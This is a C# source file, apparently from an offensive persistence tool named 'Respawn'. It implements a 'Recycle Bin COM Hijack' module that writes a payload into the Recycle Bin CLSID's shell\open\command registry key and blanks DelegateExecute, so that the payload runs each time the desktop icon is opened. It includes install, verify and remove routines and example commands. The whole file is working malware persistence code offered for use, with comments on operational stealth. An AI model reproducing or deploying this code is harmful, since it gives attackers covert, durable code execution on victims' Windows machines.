using System;
using System.Collections.Generic;
using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.RecycleBin
{
    public class RecycleBinModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "recycle";
        public string Name        => "Recycle Bin COM Hijack";
        public string Mitre       => "";
        public string Description => "Persist by hijacking the Component Object Model (COM) class identifier (CLSID) associated with the Windows Recycle Bin, routing execution to a malicious payload whenever the desktop icon is opened.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-k,  --key", "Target Key ID (e.g. 'hkcu-recycle')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t recycle -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t recycle -a install -k hkcu-recycle -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t recycle -a verify  -k hkcu-recycle");
            TechniqueHelpBuilder.RenderExample("Respawn -t recycle -a remove  -k hkcu-recycle");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return RecycleBinKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = RecycleBinKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                // We navigate down to \shell\open\command
                using var baseKey = OpenForWrite(ctx.Key, create: true);
                if (baseKey == null)
                    return TechniqueResult.Denied($"Access denied opening registry key: {key.Path}");

                using var shellKey = baseKey.CreateSubKey("shell");
                using var openKey = shellKey?.CreateSubKey("open");
                using var commandKey = openKey?.CreateSubKey("command");

                if (commandKey == null)
                    return TechniqueResult.Fail("Failed to create the 'shell\\open\\command' subkeys.");

                // Check if it's already hijacked
                var existing = commandKey.GetValue("")?.ToString();
                if (!string.IsNullOrEmpty(existing) && existing != "DelegateExecute")
                {
                     // Only warn if the existing value looks like an actual payload, not just empty
                     if(existing.Contains(".exe") || existing.Contains(".bat") || existing.Contains(".ps1"))
                        return TechniqueResult.Exists($"Recycle Bin is already hijacked with payload: {existing}");
                }

                // 1. Set the payload path
                commandKey.SetValue("", $"\"{ctx.Payload}\"");

                // 2. CRITICAL OPSEC: Nullify DelegateExecute
                // If we don't do this, Windows ignores our payload and uses the native COM object
                commandKey.SetValue("DelegateExecute", "", RegistryValueKind.String);

                return TechniqueResult.Ok($"Hijacked Recycle Bin '{key.Path}' -> '{ctx.Payload}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = RecycleBinKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var baseKey = OpenForWrite(ctx.Key, create: false);
                if (baseKey == null)
                    return TechniqueResult.NotFound($"Registry key not found: {key.Path}");

                using var shellKey = baseKey.OpenSubKey("shell", true);
                if (shellKey == null)
                    return TechniqueResult.NotFound($"No hijack found. 'shell' subkey does not exist.");

                // Completely remove the 'open' verb to restore native functionality
                shellKey.DeleteSubKeyTree("open", throwOnMissingSubKey: false);
                
                return TechniqueResult.Ok($"Restored native Recycle Bin functionality for {key.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = RecycleBinKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key id '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                using var baseKey = OpenForRead(ctx.Key);
                if (baseKey == null)
                    return TechniqueResult.NotFound($"Registry key not found: {key.Path}");

                using var commandKey = baseKey.OpenSubKey(@"shell\open\command");
                if (commandKey == null)
                    return TechniqueResult.NotFound($"Hijack not present. 'shell\\open\\command' missing under {key.Path}");

                var payload = commandKey.GetValue("")?.ToString();
                var delegateExecute = commandKey.GetValue("DelegateExecute");

                if (string.IsNullOrEmpty(payload))
                    return TechniqueResult.NotFound($"Command key exists but no payload is set.");

                if (delegateExecute == null)
                    return TechniqueResult.Fail($"WARNING: Payload '{payload}' is set, but 'DelegateExecute' bypass is missing. Execution will likely fail on modern OS.");

                return TechniqueResult.Ok($"Verified hijack -> '{payload}' (DelegateExecute bypassed) under {key.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Key '{ctx.Key}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private RegistryKey? OpenForWrite(string keyId, bool create)
        {
            var (hive, path) = ResolvePath(keyId);
            return create
                ? hive.CreateSubKey(path, writable: true)
                : hive.OpenSubKey(path, writable: true);
        }

        private RegistryKey? OpenForRead(string keyId)
        {
            var (hive, path) = ResolvePath(keyId);
            return hive.OpenSubKey(path, writable: false);
        }

        private (RegistryKey hive, string path) ResolvePath(string keyId)
        {
            return keyId.ToLower() switch
            {
                "hkcu-recycle" => (Microsoft.Win32.Registry.CurrentUser, @"Software\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"),
                "hkcr-recycle" => (Microsoft.Win32.Registry.ClassesRoot, @"CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"),
                _                  => throw new ArgumentException($"Unknown key id: {keyId}")
            };
        }
    }
}